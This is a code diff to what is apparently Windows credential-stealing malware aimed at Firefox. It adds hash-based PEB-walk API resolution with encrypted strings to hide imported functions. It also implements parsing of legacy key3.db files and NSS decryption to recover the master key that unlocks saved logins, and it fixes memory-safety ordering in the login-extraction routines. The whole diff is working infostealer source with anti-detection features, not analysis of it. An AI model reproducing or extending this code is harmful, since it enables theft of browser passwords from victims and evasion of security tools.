@@ -15,10 +15,15 @@
  */
 
 #include "firefox.h"
+#include "config.h"
 #include "browser_paths.h"
 #include "firefox_crypto.h"
 #include "utils/base64.h"
 #include "sqlite.h"
+#include "peb.h"
+#include "hash.h"
+#include "export_resolve.h"
+#include "enc_strings.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -42,6 +47,39 @@ static void *compat_memmem(const void *haystack, size_t haystack_len,
     return NULL;
 }
 #define memmem compat_memmem
+
+/* ── PEB-walk singleton for Find* APIs ──────────────────────── */
+typedef HANDLE (WINAPI *pFindFirstFileA_ff)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindNextFileA_ff)(HANDLE, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindClose_ff)(HANDLE);
+typedef DWORD  (WINAPI *pGetFileAttributesA_ff)(LPCSTR);
+
+static struct {
+    pFindFirstFileA_ff      pFF;
+    pFindNextFileA_ff       pFN;
+    pFindClose_ff           pFC;
+    pGetFileAttributesA_ff  pGFAA;
+    int ready;
+} g_ff_find;
+
+static int ff_find_ensure_api(void) {
+    if (g_ff_find.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    g_ff_find.pFF = (pFindFirstFileA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    g_ff_find.pFN = (pFindNextFileA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    g_ff_find.pFC = (pFindClose_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
+    g_ff_find.pGFAA = (pGetFileAttributesA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_ff_find.pFF || !g_ff_find.pFN || !g_ff_find.pFC || !g_ff_find.pGFAA) return 0;
+    g_ff_find.ready = 1;
+    return 1;
+}
 
 #else
 #include <sys/stat.h>
@@ -85,7 +123,8 @@ static char *path_join(const char *a, const char *b) {
 
 static int dir_exists(const char *path) {
 #ifdef _WIN32
-    DWORD attr = GetFileAttributesA(path);
+    if (!ff_find_ensure_api()) return 0;
+    DWORD attr = g_ff_find.pGFAA(path);
     return (attr != INVALID_FILE_ATTRIBUTES &&
             (attr & FILE_ATTRIBUTE_DIRECTORY));
 #else
@@ -98,7 +137,8 @@ static int dir_exists(const char *path) {
 
 static int file_exists(const char *path) {
 #ifdef _WIN32
-    DWORD attr = GetFileAttributesA(path);
+    if (!ff_find_ensure_api()) return 0;
+    DWORD attr = g_ff_find.pGFAA(path);
     return (attr != INVALID_FILE_ATTRIBUTES &&
             !(attr & FILE_ATTRIBUTE_DIRECTORY));
 #else
@@ -131,7 +171,8 @@ static char **list_subdirs(const char *path, size_t *count) {
     snprintf(search, sizeof(search), "%s\\*", path);
 
     WIN32_FIND_DATAA fd;
-    HANDLE h = FindFirstFileA(search, &fd);
+    if (!ff_find_ensure_api()) { free(result); return NULL; }
+    HANDLE h = g_ff_find.pFF(search, &fd);
     if (h == INVALID_HANDLE_VALUE) {
         free(result);
         return NULL;
@@ -151,9 +192,9 @@ static char **list_subdirs(const char *path, size_t *count) {
             result = tmp;
         }
         result[(*count)++] = full;
-    } while (FindNextFileA(h, &fd));
+    } while (g_ff_find.pFN(h, &fd));
 
-    FindClose(h);
+    g_ff_find.pFC(h);
 #else
     DIR *d = opendir(path);
     if (!d) { free(result); return NULL; }
@@ -196,22 +237,146 @@ static char **list_subdirs(const char *path, size_t *count) {
  *
  * Returns 0 on success, -1 on failure.
  */
+static uint32_t be32(const uint8_t *p) {
+    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
+           ((uint32_t)p[2] << 8)  | (uint32_t)p[3];
+}
+
+static uint16_t be16(const uint8_t *p) {
+    return (uint16_t)((p[0] << 8) | p[1]);
+}
+
+static int bdb_find_value(const uint8_t *data, size_t data_len,
+                          const char *key_name,
+                          uint8_t **out_val, size_t *out_len) {
+    if (data_len < 64) return -1;
+    uint32_t magic = be32(data);
+    if (magic != 0x00061561) return -1;
+    uint32_t ps = be32(data + 12);
+    if (ps < 512 || ps > 65536) return -1;
+    if (data_len < 0x3C) return -1;
+    uint32_t nb_key = be32(data + 0x38);
+    if (nb_key == 0 || nb_key > 1000) return -1;
+
+    for (uint32_t page = 1; page < 10 && (size_t)page * ps < data_len; page++) {
+        size_t pb = (size_t)page * ps;
+        if (pb + 4 > data_len) break;
+        uint32_t entries = nb_key * 2;
+        if (entries > 256) entries = 256;
+        if (pb + 2 + entries * 2 > data_len) continue;
+
+        uint16_t off[256];
+        for (uint32_t i = 0; i < entries; i++)
+            off[i] = be16(data + pb + 2 + i * 2);
+
+        for (uint32_t i = 0; i + 1 < entries; i += 2) {
+            size_t vs = pb + off[i];
+            size_t ks = pb + off[i + 1];
+            size_t end2 = (i + 2 < entries) ? pb + off[i + 2] : pb + ps;
+            if (ks >= data_len || end2 > data_len || vs >= ks) continue;
+            size_t kl = end2 - ks;
+            size_t vl = ks - vs;
+            if (kl == strlen(key_name) && memcmp(data + ks, key_name, kl) == 0) {
+                *out_val = (uint8_t *)malloc(vl);
+                if (!*out_val) return -1;
+                memcpy(*out_val, data + vs, vl);
+                *out_len = vl;
+                return 0;
+            }
+        }
+    }
+    return -1;
+}
+
+static int bdb_find_bin_key(const uint8_t *data, size_t data_len,
+                            const uint8_t *key, size_t key_len,
+                            uint8_t **out_val, size_t *out_len) {
+    if (data_len < 64) return -1;
+    uint32_t ps = be32(data + 12);
+    if (ps < 512 || ps > 65536) return -1;
+    /* ponytail: 0x3C=60, unreachable after data_len<64 check above; removed */
+    uint32_t nb_key = be32(data + 0x38);
+    if (nb_key == 0 || nb_key > 1000) return -1;
+
+    for (uint32_t page = 1; page < 10 && (size_t)page * ps < data_len; page++) {
+        size_t pb = (size_t)page * ps;
+        if (pb + 4 > data_len) break;
+        uint32_t entries = nb_key * 2;
+        if (entries > 256) entries = 256;
+        if (pb + 2 + entries * 2 > data_len) continue;
+
+        uint16_t off[256];
+        for (uint32_t i = 0; i < entries; i++)
+            off[i] = be16(data + pb + 2 + i * 2);
+
+        for (uint32_t i = 0; i + 1 < entries; i += 2) {
+            size_t vs = pb + off[i];
+            size_t ks = pb + off[i + 1];
+            size_t end2 = (i + 2 < entries) ? pb + off[i + 2] : pb + ps;
+            if (ks >= data_len || end2 > data_len || vs >= ks) continue;
+            size_t kl = end2 - ks;
+            size_t vl = ks - vs;
+            if (kl == key_len && memcmp(data + ks, key, kl) == 0) {
+                *out_val = (uint8_t *)malloc(vl);
+                if (!*out_val) return -1;
+                memcpy(*out_val, data + vs, vl);
+                *out_len = vl;
+                return 0;
+            }
+        }
+    }
+    return -1;
+}
+
 static int try_key3_db(const char *profile_path,
                         unsigned char *key_out, size_t *key_len) {
     char *key3_path = path_join(profile_path, "key3.db");
     if (!key3_path) return -1;
 
-    FILE *f = fopen(key3_path, "rb");
-    if (!f) { free(key3_path); return -1; }
-    fclose(f);
+    size_t flen = 0;
+    uint8_t *fdata = read_file(key3_path, &flen);
     free(key3_path);
+    if (!fdata) return -1;
 
-    /* key3.db uses a different schema (metadata table, 3DES instead of AES).
-     * TODO: implement full key3.db decryption. */
-    (void)key_out;
-    (void)key_len;
-    return -1;
+    uint8_t *gs = NULL; size_t gsl = 0;
+    if (bdb_find_value(fdata, flen, "global-salt", &gs, &gsl) != 0) {
+        free(fdata); return -1;
+    }
+
+    uint8_t *pc = NULL; size_t pcl = 0;
+    if (bdb_find_value(fdata, flen, "password-check", &pc, &pcl) != 0) {
+        free(gs); free(fdata); return -1;
+    }
+
+    unsigned char pdec[128]; size_t pdecl = 0;
+    int rc = fx_decrypt_nss_pbe(gs, gsl, (const unsigned char *)"", 0,
+                                 pc, pcl, pdec, sizeof(pdec), &pdecl);
+    free(pc);
+    if (rc != 0 || pdecl < 14 || memcmp(pdec, "password-check", 14) != 0) {
+        free(gs); free(fdata); return -1;
+    }
+
+    uint8_t nss_key[16];
+    nss_key[0] = 0xf8;
+    memset(nss_key + 1, 0, 14);
+    nss_key[15] = 0x01;
+
+    uint8_t *nb = NULL; size_t nbl = 0;
+    if (bdb_find_bin_key(fdata, flen, nss_key, 16, &nb, &nbl) != 0) {
+        free(gs); free(fdata); return -1;
+    }
+
+    unsigned char ndec[512]; size_t ndecl = 0;
+    rc = fx_decrypt_nss_pbe(gs, gsl, (const unsigned char *)"", 0,
+                             nb, nbl, ndec, sizeof(ndec), &ndecl);
+    free(nb); free(gs); free(fdata);
+    if (rc != 0 || ndecl < 24) return -1;
+
+    memcpy(key_out, ndec + ndecl - 24, 24);
+    *key_len = 24;
+    return 0;
 }
+
 
 static int firefox_extract_key(const char *profile_path,
                                unsigned char *nss_key_out, size_t *nss_key_len) {
@@ -276,6 +441,13 @@ static int firefox_extract_key(const char *profile_path,
         }
     }
 
+    if (!global_salt || !password_blob) {
+        sqlite_free_rows(meta_rows, meta_count);
+        sqlite_close(&db);
+        free(db_data);
+        return -1;
+    }
+
     /* Copy before sqlite_free_rows to avoid use-after-free */
     unsigned char gs_buf[256], pw_buf[1024];
     size_t gs_buf_len = gs_len < sizeof(gs_buf) ? gs_len : sizeof(gs_buf);
@@ -288,12 +460,6 @@ static int firefox_extract_key(const char *profile_path,
     pb_len = pw_buf_len;
 
     sqlite_free_rows(meta_rows, meta_count);
-
-    if (!global_salt || !password_blob) {
-        sqlite_close(&db);
-        free(db_data);
-        return -1;
-    }
 
     /* ── Step 2: Decrypt password blob with metaPBE ─────────── */
 
@@ -345,6 +511,13 @@ static int firefox_extract_key(const char *profile_path,
         }
     }
 
+    if (!nss_enc) {
+        sqlite_free_rows(priv_rows, priv_count);
+        sqlite_close(&db);
+        free(db_data);
+        return -1;
+    }
+
     /* Copy before sqlite_free_rows to avoid use-after-free */
     unsigned char nss_buf[512];
     size_t nss_buf_len = nss_enc_len < sizeof(nss_buf) ? nss_enc_len : sizeof(nss_buf);
@@ -355,8 +528,6 @@ static int firefox_extract_key(const char *profile_path,
     sqlite_free_rows(priv_rows, priv_count);
     sqlite_close(&db);
     free(db_data);
-
-    if (!nss_enc) return -1;
 
     /* ── Step 4: Decrypt nssPrivate key with nssPBE ─────────── */
 
@@ -571,6 +742,12 @@ static char **firefox_extract_logins(const char *profile_path, size_t *count) {
             }
         }
     }
+    if (!global_salt) {
+        sqlite_free_rows(meta_rows, meta_count);
+        sqlite_close(&db);
+        free(db_data);
+        return NULL;
+    }
     /* Copy before sqlite_free_rows to avoid use-after-free */
     unsigned char gs_local[256];
     size_t gs_local_len = gs_len < sizeof(gs_local) ? gs_len : sizeof(gs_local);
@@ -581,8 +758,6 @@ static char **firefox_extract_logins(const char *profile_path, size_t *count) {
     sqlite_free_rows(meta_rows, meta_count);
     sqlite_close(&db);
     free(db_data);
-
-    if (!global_salt) return NULL;
 
     /* Read and parse logins.json */
     char *logins_path = path_join(profile_path, "logins.json");
@@ -899,8 +1074,8 @@ CollectResult collect_firefox(const char *roaming_app_data) {
             BrowserData *bd = &result.data[result.count];
             memset(bd, 0, sizeof(*bd));
 
-            bd->browser_name = strdup(browsers[b].name);
-            bd->profile_name = strdup(basename_of(profiles[p]));
+            bd->browser_name = mi_strdup(browsers[b].name);
+            bd->profile_name = mi_strdup(basename_of(profiles[p]));
 
             /* Extract logins (key4.db + logins.json) */
             bd->logins = firefox_extract_logins(profiles[p], &bd->login_count);
